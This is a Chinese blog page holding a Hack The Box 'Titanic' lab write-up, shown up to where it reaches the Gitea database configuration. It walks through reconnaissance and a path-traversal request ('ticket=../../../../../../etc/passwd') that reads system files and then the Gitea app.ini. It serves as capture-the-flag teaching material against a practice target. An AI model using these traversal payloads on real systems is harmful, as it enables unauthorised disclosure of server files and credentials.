@@ -1,0 +1,844 @@
+
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="light">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>XSS-and-Security-Labs：Hackthebox 赛季靶场 Titanic Writeup - Rabbit's Blog</title>
+
+  
+    <meta name="description" content="靶机信息:  IP 地址: 10.10.11.55 目标: 获取 user.txt 和 root.txt  一、 信息收集与初始探测 1. 端口扫描 (Nmap) 首先使用 Nmap 对目标进行端口扫描，了解开放的服务：  扫描结果显示开放了 22 (SSH) 和 80 (HTTP) 端口。HTTP 服务返回 302 重定向，指向域名 http:&#x2F;&#x2F;titanic.htb&#x2F;。 2. 配置 Host">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox 赛季靶场 Titanic Writeup">
+<meta property="og:url" content="https://askrabbit.cn/2025/04/05/Titanic/">
+<meta property="og:site_name" content="Rabbit&#39;s Blog">
+<meta property="og:description" content="靶机信息:  IP 地址: 10.10.11.55 目标: 获取 user.txt 和 root.txt  一、 信息收集与初始探测 1. 端口扫描 (Nmap) 首先使用 Nmap 对目标进行端口扫描，了解开放的服务：  扫描结果显示开放了 22 (SSH) 和 80 (HTTP) 端口。HTTP 服务返回 302 重定向，指向域名 http:&#x2F;&#x2F;titanic.htb&#x2F;。 2. 配置 Host">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404152844879.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153323193.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153537156.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153729818.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404161908580.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404161807875.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405115215696.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404174628401.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404174601395.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405115828457.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405121546373.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405123106575.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405123159724.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405124107721.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405133810808.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405134020289.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405141629124.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405143242393.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151136589.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151201427.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151308895.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405151344371.png">
+<meta property="og:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405152445792.png">
+<meta property="article:published_time" content="2025-04-05T09:46:25.000Z">
+<meta property="article:modified_time" content="2025-04-05T09:46:25.000Z">
+<meta property="article:author" content="Rabbit">
+<meta property="article:tag" content="Hack The Box">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404152844879.png">
+  
+  
+  
+  <meta name="keywords" content="编程, Web开发, 前端, 后端, JavaScript, Python, 个人成长, 生活, 思考, Rabbit, 安全, 读书, 微信读书, 女权">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+    <link rel="shortcut icon" href="https://favorably-7690.oss-cn-beijing.aliyuncs.com/icon/%E5%85%94%E5%AD%90%20(2).png">
+  
+
+  
+
+  <link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css"
+  media="all"
+/>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body>
+
+
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><div class="icon"><img no-lazy class="icon" src="/wiki/XSS-and-Security-Labs/logo-htb.svg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></div><a class="title" href="/wiki/XSS-and-Security-Labs/"><div class="main" ff="title">XSS-and-Security-Labs</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" data-filter="/wiki/XSS-and-Security-Labs/" placeholder="在文档中搜索..."></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="主页" href="/"><span>主页</span></a><a class="nav-item active" title="探索" href="/wiki/"><span>探索</span></a></nav>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">Start</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/#start"><span class="toc-text">Web 安全靶场与 XSS 挑战文档</span></a></div><div class="widget-header dis-select"><span class="name">Hack The Box</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/index%20-%202"><span class="toc-text">Hack The Box (HTB)</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Precious"><span class="toc-text">Precious — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/MonitorsTwo"><span class="toc-text">MonitorsTwo — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Inject"><span class="toc-text">Inject — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Busqueda"><span class="toc-text">Busqueda — Hack The Box Machine</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Code"><span class="toc-text">Hackthebox 赛季靶场 Code Writeup：Python 代码编辑器漏洞利用到 Root 提权</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Dog%20%E2%80%94%20Hack%20The%20Box"><span class="toc-text">Hackthebox 赛季靶场 Dog Writeup</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/Titanic"><span class="toc-text">Hackthebox 赛季靶场 Titanic Writeup</span></a></div><div class="widget-header dis-select"><span class="name">XSS Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game"><span class="toc-text">Google XSS Game</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/XSS%20Challenges"><span class="toc-text">XSS Challenges</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/xss-labs"><span class="toc-text">xss-labs</span></a></div><div class="widget-header dis-select"><span class="name">File upload Games</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Upload-labs"><span class="toc-text">Upload-labs 靶场</span></a></div><div class="widget-header dis-select"><span class="name">SQL injection</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs"><span class="toc-text">sqli-labs 靶场（手工注入）</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/sqli-labs-SQLMap"><span class="toc-text">sqli-labs 靶场使用 SQLMap 注入（1-25 关）</span></a></div><div class="widget-header dis-select"><span class="name">Comprehensive shooting range</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/DVWA-master"><span class="toc-text">DVWA 靶场</span></a></div><div class="widget-header dis-select"><span class="name">Reproducible vulnerability</span></div><div class="widget-body fs14"><a class="link" href="/wiki/XSS-and-Security-Labs/Reproducible%20vulnerability"><span class="toc-text">已知漏洞复现与验证</span></a><a class="link" href="/wiki/XSS-and-Security-Labs/CyberPanel%20has%20a%20remote%20code%20execution%20(RCE)%20vulnerability"><span class="toc-text">【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞</span></a></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Zero-Yi7" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" onclick="switchTheme()"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" fill-rule="evenodd" d="M582.4 326.4c-140.8 0-256 115.2-256 256s115.2 256 256 256 256-115.2 256-256-115.2-256-256-256z m0 448c-70.4 0-131.2-36.8-164.8-92.8 12.8 3.2 27.2 4.8 40 4.8 121.6 0 219.2-99.2 219.2-219.2 0-17.6-1.6-35.2-6.4-52.8 60.8 32 102.4 96 102.4 169.6 1.6 104-84.8 190.4-190.4 190.4zM582.4 262.4c17.6 0 32-14.4 32-32v-128c0-17.6-14.4-32-32-32s-32 14.4-32 32v128c0 17.6 14.4 32 32 32zM262.4 582.4c0-17.6-14.4-32-32-32h-128c-17.6 0-32 14.4-32 32s14.4 32 32 32h128c17.6 0 32-14.4 32-32zM310.4 356.8c6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6 12.8-12.8 12.8-32 0-44.8l-91.2-91.2c-12.8-12.8-32-12.8-44.8 0-12.8 12.8-12.8 32 0 44.8l91.2 91.2zM944 220.8c-12.8-12.8-32-12.8-44.8 0l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-33.6 0-44.8zM310.4 808l-91.2 91.2c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 14.4 9.6 22.4 9.6 8 0 16-3.2 22.4-9.6l91.2-91.2c12.8-12.8 12.8-32 0-44.8-11.2-11.2-32-11.2-44.8 0z"></path></svg></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki">文档</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/XSS-and-Security-Labs/">XSS-and-Security-Labs</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">更新于：<time datetime="2025-04-05T09:46:25.000Z">2025-04-05</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Hackthebox 赛季靶场 Titanic Writeup</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p><strong>靶机信息:</strong></p>
+<ul>
+<li><strong>IP 地址:</strong> 10.10.11.55</li>
+<li><strong>目标:</strong> 获取 user.txt 和 root.txt</li>
+</ul>
+<h3 id="一、-信息收集与初始探测">一、 信息收集与初始探测</h3>
+<h4 id="1-端口扫描-Nmap">1. 端口扫描 (Nmap)</h4>
+<p>首先使用 Nmap 对目标进行端口扫描，了解开放的服务：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404152844879.png" alt="Nmap扫描结果"></p>
+<p>扫描结果显示开放了 22 (SSH) 和 80 (HTTP) 端口。HTTP 服务返回 302 重定向，指向域名 <code>http://titanic.htb/</code>。</p>
+<h4 id="2-配置-Hosts-文件">2. 配置 Hosts 文件</h4>
+<p>为了正常访问 Web 服务，我们需要将域名和 IP 地址添加到本地 hosts 文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.55  titanic.htb</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153323193.png" alt="编辑hosts文件"></p>
+<h4 id="3-访问-Web-服务">3. 访问 Web 服务</h4>
+<p>配置好 hosts 文件后，在浏览器中访问 <code>http://titanic.htb/</code>。看到了一个关于泰坦尼克号邮轮预订的网站。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153537156.png" alt="网站首页"></p>
+<p>网站底部有一个预订信息的提交表单：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404153729818.png" alt="预订表单"></p>
+<h3 id="二、-Web-应用枚举与漏洞发现">二、 Web 应用枚举与漏洞发现</h3>
+<h4 id="1-技术栈识别-WhatWeb">1. 技术栈识别 (WhatWeb)</h4>
+<p>使用 <code>whatweb</code> 识别网站使用的技术：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://titanic.htb/</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404161908580.png" alt="WhatWeb识别结果"></p>
+<p>关键信息：</p>
+<ul>
+<li>后端：Werkzeug/3.0.3 (Python Web 框架)</li>
+<li>Python 版本：3.10.12</li>
+<li>前端：Bootstrap, JQuery</li>
+</ul>
+<h4 id="2-目录与子域名扫描">2. 目录与子域名扫描</h4>
+<p>使用 <code>dirsearch</code> 扫描目录，但未发现有价值的信息（大多是 40x 错误）。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404161807875.png" alt="Dirsearch结果"></p>
+<p>接着，使用 <code>gobuster</code> 结合子域名字典进行子域名爆破：</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405115215696.png" alt="Gobuster发现子域名"></p>
+<p>扫描发现了一个子域名 <code>dev.titanic.htb</code>。将其添加到 hosts 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.55  titanic.htb dev.titanic.htb</span><br></pre></td></tr></table></figure>
+<h4 id="3-表单提交与路径遍历漏洞">3. 表单提交与路径遍历漏洞</h4>
+<p>回到主站 <code>http://titanic.htb/</code>，尝试提交预订表单，并使用 Burp Suite 拦截请求和响应。</p>
+<p>提交表单后，服务器返回一个 302 重定向，指向一个下载链接，格式为 <code>/download?ticket=UUID.json</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404174628401.png" alt="Burp拦截表单提交响应"></p>
+<p>这个 <code>ticket</code> 参数看起来很可疑。尝试利用它进行<strong>路径遍历</strong>，读取服务器上的敏感文件。我们尝试读取 <code>/etc/passwd</code>：</p>
+<p>修改 Burp Repeater 中的请求，将 <code>/download?ticket=UUID.json</code> 改为 <code>/download?ticket=../../../../../../etc/passwd</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250404174601395.png" alt="路径遍历读取passwd"></p>
+<p>成功读取！这确认了路径遍历漏洞的存在。在 <code>/etc/passwd</code> 中，我们注意到了 <code>developer</code> 用户。</p>
+<h3 id="三、-利用路径遍历深入挖掘">三、 利用路径遍历深入挖掘</h3>
+<h4 id="1-探索开发环境-dev-titanic-htb">1. 探索开发环境 (<code>dev.titanic.htb</code>)</h4>
+<p>访问之前发现的子域名 <code>http://dev.titanic.htb/</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405115828457.png" alt="dev子域名首页"></p>
+<p>页面显示这是一个 Gitea 服务（一个自托管的 Git 服务），然后转向左上角探索，可以看到代码仓库。</p>
+<p>查看到 <code>docker-compose.yml</code> 的配置片段。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">/home/developer/gitea/data:/data</span> <span class="comment"># Replace with your path</span></span><br></pre></td></tr></table></figure>
+<p>这表明 Gitea 容器的 <code>/data</code> 目录映射到了宿主机的 <code>/home/developer/gitea/data</code> 目录。</p>
+<h4 id="2-读取-Gitea-配置文件">2. 读取 Gitea 配置文件</h4>
+<p>Gitea 的默认配置文件通常位于 <code>/etc/gitea/conf/app.ini</code> 或其数据目录下的 <code>gitea/conf/app.ini</code>。结合上面发现的 Volume 映射，我们可以推断出宿主机上配置文件的实际路径可能是 <code>/home/developer/gitea/data/gitea/conf/app.ini</code>。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405121546373.png" alt="读取Gitea配置文件"></p>
+<h4 id="3-分析配置文件，定位数据库">3. 分析配置文件，定位数据库</h4>
+<p>利用之前发现的路径遍历漏洞，尝试读取这个文件：</p>
+<p>在 <code>app.ini</code> 文件中，我们找到了数据库的配置信息：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">DB_TYPE</span>  = sqlite3</span><br><span class="line"><span class="attr">HOST</span>     = <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">3306</span></span><br><span class="line"><span class="attr">NAME</span>     = gitea</span><br><span class="line"><span class="attr">USER</span>     = root</span><br><span class="line"><span class="attr">PASSWD</span>   =</span><br><span class="line"><span class="attr">PATH</span>     = /data/gitea/gitea.db  <span class="comment">; Path to the database file for sqlite3</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/Hackthebox%20%E8%B5%9B%E5%AD%A3%E9%9D%B6%E5%9C%BA%20Titanic%20Writeup/image-20250405123106575.png" alt="数据库配置信息"><br>
